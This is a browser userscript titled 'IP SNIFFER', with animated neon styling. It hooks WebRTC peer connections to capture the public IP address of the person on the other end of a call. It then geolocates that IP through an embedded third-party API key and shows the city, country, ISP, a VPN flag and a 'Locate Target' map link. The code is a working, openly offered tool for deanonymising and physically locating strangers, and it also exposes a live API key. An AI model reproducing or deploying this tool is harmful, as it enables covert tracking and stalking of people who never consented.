/* IP SNIFFER by Kleine_Lars - ANIMATED CYBER EDITION
   Features: RGB Pulse, Slide-in Animations, Neon Glow, Glass-morphism
   API: cb2fd7609ede4525ace7b170c2883b92
*/

(function() {
    const MY_API_KEY = "cb2fd7609ede4525ace7b170c2883b92";

    // --- Injecting Keyframe Animations ---
    const style = document.createElement('style');
    style.innerHTML = `
        @keyframes cyberPulse {
            0% { box-shadow: 0 0 10px rgba(138, 43, 226, 0.4), inset 0 0 5px rgba(138, 43, 226, 0.1); }
            50% { box-shadow: 0 0 25px rgba(138, 43, 226, 0.7), inset 0 0 10px rgba(138, 43, 226, 0.2); }
            100% { box-shadow: 0 0 10px rgba(138, 43, 226, 0.4), inset 0 0 5px rgba(138, 43, 226, 0.1); }
        }
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .info-card {
            animation: fadeIn 0.5s ease-out forwards;
        }
    `;
    document.head.appendChild(style);

    // --- UI Setup ---
    const infoBox = document.createElement('div');
    infoBox.id = "ip-sniffer-ui";
    infoBox.style = `
        position: fixed; top: 20px; right: 20px; z-index: 2147483647;
        background: rgba(15, 15, 15, 0.85); color: #fff; padding: 22px; 
        border-radius: 20px; font-family: 'Segoe UI', Roboto, sans-serif; width: 300px;
        border: 1px solid rgba(138, 43, 226, 0.3); border-top: 3px solid #8a2be2;
        backdrop-filter: blur(15px); animation: slideIn 0.6s cubic-bezier(0.23, 1, 0.32, 1), cyberPulse 4s infinite;
        transition: all 0.4s ease;
    `;
    
    infoBox.innerHTML = `
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
            <span style="font-weight:900; font-size:11px; color:#8a2be2; letter-spacing:2px; text-shadow: 0 0 8px #8a2be2;">IP SNIFFER BY KLEINE_LARS</span>
            <div style="width:10px; height:10px; background:#8a2be2; border-radius:50%; box-shadow:0 0 12px #8a2be2;"></div>
        </div>
        <div id="status-text" style="font-size:13px; color:#777; text-align:center; padding:20px; border: 1px dashed #333; border-radius:15px;">
            <span style="display:inline-block; animation: pulse 1.5s infinite;">📡</span> Scanning for targets...
        </div>
    `;
    document.body.appendChild(infoBox);

    // --- WebRTC Logic ---
    const origRTC = window.RTCPeerConnection;
    window.RTCPeerConnection = function(...args) {
        const pc = new origRTC(...args);
        pc.oaddIceCandidate = pc.addIceCandidate;
        pc.addIceCandidate = function(ice) {
            if (ice?.candidate?.includes("srflx")) {
                fetchData(ice.candidate.split(" ")[4]);
            }
            return pc.oaddIceCandidate(ice);
        };
        return pc;
    };

    async function fetchData(ip) {
        try {
            const res = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${MY_API_KEY}&ip=${ip}`);
            const d = await res.json();
            if (!d.ip) return;

            const isProxy = /vpn|proxy|hosting|cloud|datacenter|server|digitalocean|ovh|akamai/i.test(d.isp || "");

            // --- Animated Result Update ---
            const statusContainer = document.getElementById('status-text');
            statusContainer.style.animation = 'none'; // Reset animation
            statusContainer.innerHTML = `
                <div class="info-card">
                    <div style="background:rgba(138, 43, 226, 0.1); padding:15px; border-radius:15px; border:1px solid rgba(138, 43, 226, 0.2); margin-bottom:15px; text-align:left;">
                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:5px;">
                            <span style="color:#8a2be2; font-size:9px; font-weight:bold; letter-spacing:1px;">REMOTE IP</span>
                            <span style="background:${isProxy ? '#ff4444' : '#00ff88'}; color:#000; font-size:8px; font-weight:900; padding:2px 6px; border-radius:4px; text-transform:uppercase;">
                                ${isProxy ? 'VPN Detected' : 'Residential'}
                            </span>
                        </div>
                        <div style="font-size:${d.ip.length > 15 ? '14px' : '20px'}; color:#fff; font-weight:900; text-shadow: 0 0 10px rgba(255,255,255,0.2); word-break:break-all;">
                            ${d.ip}
                        </div>
                    </div>
                    
                    <div style="text-align:left; font-size:13px; color:#ddd; padding:0 5px;">
                        <div style="margin-bottom:8px;">
                            <span style="color:#8a2be2;">📍</span> <b>${d.city || 'Unknown'}</b>, ${d.country_name} 
                            <img src="${d.country_flag}" width="16" style="vertical-align:middle; margin-left:8px; border-radius:2px; box-shadow: 0 0 5px rgba(0,0,0,0.5);">
                        </div>
                        <div style="font-size:11px; color:#666; border-left: 2px solid #333; padding-left:10px;">
                            ${d.isp.substring(0, 35)}
                        </div>
                    </div>

                    <a href="https://www.google.com/maps?q=${d.latitude},${d.longitude}" target="_blank" 
                       style="display:block; background:#8a2be2; color:#fff; text-align:center; padding:12px; text-decoration:none; border-radius:12px; font-weight:900; font-size:12px; margin-top:18px; transition: 0.3s; box-shadow: 0 5px 15px rgba(138, 43, 226, 0.4); text-transform:uppercase; letter-spacing:1px;">
                       🛰️ Locate Target
                    </a>
                </div>
            `;
            
            // Effect voor knop hover
            const btn = statusContainer.querySelector('a');
            btn.onmouseover = () => { btn.style.background = '#9d42f5'; btn.style.transform = 'scale(1.02)'; };
            btn.onmouseout = () => { btn.style.background = '#8a2be2'; btn.style.transform = 'scale(1)'; };

        } catch (e) { console.error("Capture Error", e); }
    }
})();
